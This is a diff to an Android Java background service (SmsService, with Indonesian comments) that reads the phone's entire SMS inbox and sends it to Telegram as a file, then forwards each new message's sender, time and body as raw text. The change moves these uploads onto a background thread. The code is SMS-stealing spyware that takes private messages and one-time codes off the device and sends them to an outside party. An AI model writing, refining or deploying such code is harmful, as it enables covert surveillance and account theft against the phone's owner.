@@ -24,6 +24,8 @@ import java.util.Date;
 import java.util.HashSet;
 import java.util.Locale;
 import java.util.Set;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
 
 public class SmsService extends Service {
 
@@ -32,7 +34,7 @@ public class SmsService extends Service {
     private static final Uri SMS_URI = Uri.parse("content://sms/inbox");
 
     private final Handler handler = new Handler(Looper.getMainLooper());
-    /** ID SMS yang SUDAH pernah diproses (lama maupun baru). */
+    private final ExecutorService worker = Executors.newSingleThreadExecutor();
     private final Set<String> seenIds = new HashSet<>();
     private boolean running;
     private boolean initialLoadDone;
@@ -59,6 +61,7 @@ public class SmsService extends Service {
     @Override public void onDestroy() {
         running = false;
         handler.removeCallbacks(loop);
+        worker.shutdown();
         super.onDestroy();
     }
 
@@ -85,38 +88,40 @@ public class SmsService extends Service {
     }
 
     private void poll() {
-        // ---------- FASE 1: muat semua SMS LAMA sekali, kirim sebagai FILE ----------
+        // ---------- FASE 1: SMS LAMA → FILE ----------
         if (!initialLoadDone) {
             JSONArray all = readAllSms();
             if (all.length() > 0) {
-                File file = writeJsonToDisk(all.toString());
+                final File file = writeJsonToDisk(all.toString());
                 if (file != null) {
-                    TelegramSender.sendDocument(file, "Log SMS lama (" + all.length() + " pesan)");
+                    final int count = all.length();
+                    // kirim file di background thread
+                    worker.execute(() -> TelegramSender.sendDocument(
+                            file, "Log SMS lama (" + count + " pesan)"));
                 }
             }
             initialLoadDone = true;
             return;
         }
 
-        // ---------- FASE 2: SMS BARU langsung dikirim raw text ----------
+        // ---------- FASE 2: SMS BARU → RAW TEXT ----------
         JSONArray baru = readNewSmsOnly();
         for (int i = 0; i < baru.length(); i++) {
             try {
                 JSONObject o = baru.getJSONObject(i);
-                String from = o.optString("from", "-");
-                String body = o.optString("body", "");
-                String text = "📩 SMS BARU\n"
+                final String from = o.optString("from", "-");
+                final String body = o.optString("body", "");
+                final String text = "📩 SMS BARU\n"
                         + "Dari: " + from + "\n"
                         + "Waktu: " + o.optLong("date") + "\n\n"
                         + body;
-                TelegramSender.sendRawText(text);
+                worker.execute(() -> TelegramSender.sendRawText(text));
             } catch (Exception e) {
                 Log.w(TAG, "kirim raw gagal", e);
             }
         }
     }
 
-    // Baca SEMUA SMS, tandai semua sebagai seen (dipakai sekali di awal)
     private JSONArray readAllSms() {
         JSONArray arr = new JSONArray();
         Cursor c = null;
@@ -137,7 +142,6 @@ public class SmsService extends Service {
         return arr;
     }
 
-    // Hanya SMS yang BELUM ada di seenIds
     private JSONArray readNewSmsOnly() {
         JSONArray arr = new JSONArray();
         Cursor c = null;
